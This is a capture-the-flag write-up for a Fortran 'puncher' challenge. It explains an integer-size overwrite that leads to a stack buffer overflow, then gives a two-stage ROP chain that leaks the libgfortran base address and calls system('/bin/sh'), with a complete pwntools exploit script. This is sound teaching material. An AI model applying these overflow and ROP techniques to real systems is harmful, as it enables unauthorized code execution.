# Puncher

## Challenge description

We're back in the 60s!

## Challenge files

- `chall.f90`: source code of the challenge, written in Fortran
- `puncher`: compiled binary from `chall.f90`
- `libgfortran.so.5`: Fortran library

## About the challenge

The `puncher` program reads lines, and prints the punch card encodings of them.

## The vulnerability

The main function (see below) looks a bit weird: it sets `A = 0`, then checks if `A == 0`, without doing anything with `A` in between. `A` will be later used as a buffer size in `readString(X, A)`, and normally it is set to `64`, which is the same as the length of `X`. If we can somehow modify `A`, then it would result in a buffer overflow.

There are two 2-byte integers next to each other: `A` and `B` (actually there are three, but `C` is not important now). The `readInt` function reads a 4-byte integer, hence we have control over not only `B`, but `A`, too. If we give `2**24+1 == 0x01000001` to the `readInt` function, then it will set `B` to `1` and `A` to `0x100`:

```
0x 0100 0001
  |AAAA|BBBB|
```

Now when the program reaches `readString`, it will read `256` bytes into a `64`-byte buffer: we have a stack buffer overflow.

```
PROGRAM puncher
  IMPLICIT NONE
  CHARACTER(len=64) :: X
  INTEGER(2) :: A,B, C
  A = 0  ! A is set to zero
  B = 0
  write(*,*) 'How many lines do you want to read?'
  CALL readInt(B)
  IF (A==0) THEN  ! Check if A is still zero
    A=64
  END IF
  DO C=1,B
    write(*,*) 'Reading line ', C
    CALL readString(X, A)
    CALL punch(X,A)
  END DO
END PROGRAM
```

## Exploitation

In order to create an exploitation plan, first look at the protections applied to the binary:

- NX enabled: no shellcode
- Stack canary disabled: we can overwrite the return address
- PIE disabled: we have some code that we know the address of

Based on this, we can see that we can use a ROP chain.

The `puncher` binary itself didn't contain any code that we could use to open a shell, but it had some functions that we could use to leak the address of `libgfortran.so.5`. First I wanted to use the imported functions if the Fortran library, but using them to print something is really complicated; a simple `write` in the source code compiles to four different functions being called, so I looked for a simpler solution. I saw that the `punch` function prints the original text before the punch card. However, it has a side effect: it calls `to_upper` on the input, which means that if the address that we want to leak has lowercase letters in it, then we will get the wrong address. We will overcome this issue by trying until we succeed (shouldn't take more than a few tries). I leaked the address of `_gfortran_st_write_done` by calling

```
punch(GOT address of _gfortran_st_write_done, 8)
```

Looking at the binary, we can see that `punch` actually expects an address that points to `A` as the second argument:

```
0x00401273      488b8580fcff.  mov rax, qword [rbp-0x380]  ; A is stored at rbp-0x380
0x0040127a      0fb700         movzx eax, word [rax]
```

This just means that we have to find a place in the `puncher` binary where the number `8` is stored. Luckily, we found such place.

We have to set the first two arguments before calling the function, which are passed in `rdi` and `rsi`. Hence we need some gadgets:

```
0x00402033      5f             pop rdi
0x00402034      c3             ret

0x00402031      5e             pop rsi
0x00402032      415f           pop r15
0x00402034      c3             ret
```

After we call `punch`, we should return to `main`, so that we can give some input again, now with the knowledge of the base address of the Fortran library. Hence the first stage ROP chain looks like this (each entry is 8 bytes):

```
pop rdi gadget
GOT address of _gfortran_st_write_done  ; puts the GOT address into rdi
pop rsi pop r15 gadget
pointer to 8  ; puts a pointer to the number 8 into rsi
0  ; could be anything, it goes into r15
address of punch  ; calls the punch function
address of main  ; jump back to main
```

Now we can send the second stage ROP chain, using the base address of the Fortran library. The Fortran library contains both the string `"/bin/sh"` and an import to `system`, so we can easily open a shell:

```
pop rdi gadget
address of "/bin/sh"
address of system
```

There is one more thing that we need to take care about: we use the overflow in `readString`, and then take control of the program when the main function returns. Between these two events, `punch(X, A)` is called. When we overflow the stack, we overwrite `A` as well. If we put a random value in `A`, we might set it to a really big number, which means a segmentation fault will occur in `punch`, because it will try to read from beyond the bottom of the stack. To avoid this, we just set `A` to zero.

## Exploit script

```python
from pwn import *
import hashlib
from itertools import product

binary = ELF("./puncher")
libgfortran = ELF("./libgfortran.so.5")

def solve_pow(start_string, hash_end):
    for chars in product(string.ascii_letters, repeat=4):
        candidate = start_string + bytes(map(ord, chars))
        m = hashlib.sha256()
        m.update(candidate)
        if m.hexdigest().endswith(hash_end):
            print(f'POW solved: {candidate}')
            return candidate

    return None

if args.LOCAL:
    p = process("./puncher", env={"LD_PRELOAD": libgfortran.path})
else:
    p = connect("challs.m0lecon.it", 2637)
    p.recvuntil("Give me a string starting with ")
    start_string = p.recvuntil(" ")[:-1]
    p.recvuntil('such that its sha256sum ends in ')
    hash_end = p.recvuntil('.')[:-1].decode()
    p.sendline(solve_pow(start_string, hash_end))

p.sendlineafter("How many lines do you want to read?", str(2**24+1))

punch = binary.symbols["punch_"]
st_write_done = binary.got["_gfortran_st_write_done"]
pop_rdi = 0x00402033
pop_rsi_r15 = 0x00402031
address_of_eight = 0x00403330

payload = b'A'*0x40  # the original buffer
payload += b'B'*0xe  # some padding
payload += b'\x00\x00'  # set A to zero
payload += b'C'*0x10  # some padding
payload += b'D'*0x8  # saved RBP

# Here starts the rop chain
payload += p64(pop_rdi)
payload += p64(st_write_done)  # first argument of punch
payload += p64(pop_rsi_r15)
payload += p64(address_of_eight)  # second argument of punch
payload += p64(0)  # just a dummy value that goes into r15
payload += p64(punch)  # call punch
payload += p64(binary.symbols["main"])  # call main

p.sendlineafter("Reading line", payload)

p.recvuntil("_______________________________________________________________")
p.recvuntil("_______________________________________________________________")
p.recvuntil("_______________________________________________________________")

p.recvuntil("| ")
leak = p.recvline()
libgfortran.address = u64(leak[:8]) - libgfortran.symbols["_gfortran_st_write_done"]

print(f"libgfortran base: {hex(libgfortran.address)}")

p.sendlineafter("How many lines do you want to read?", str(2**24+1))

binsh = libgfortran.address + 0x0029c57b
system = libgfortran.symbols["system"]

payload = b'A'*0x40  # the original buffer
payload += b'B'*0xe  # some padding
payload += b'\x00\x00'  # set A to zero
payload += b'C'*0x10  # some padding
payload += b'D'*0x8  # saved RBP

# Here starts the ROP chain
payload += p64(pop_rdi)
payload += p64(binsh)  # first argument of system
payload += p64(system)  # call system

p.sendlineafter("Reading line", payload)

p.interactive()
```
